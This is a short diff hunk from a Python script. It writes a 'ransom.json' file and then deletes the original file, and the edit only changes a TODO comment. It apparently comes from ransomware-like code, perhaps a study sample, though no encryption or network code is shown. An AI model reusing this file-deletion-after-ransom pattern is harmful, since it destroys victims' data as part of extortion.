@@ -55,7 +55,7 @@ def main():
 
     du.write_json(cache_dir, 'ransom.json', ransom_json)
 
-    # TODO: delete original file
+    # delete original file
     os.remove(path)
 
 
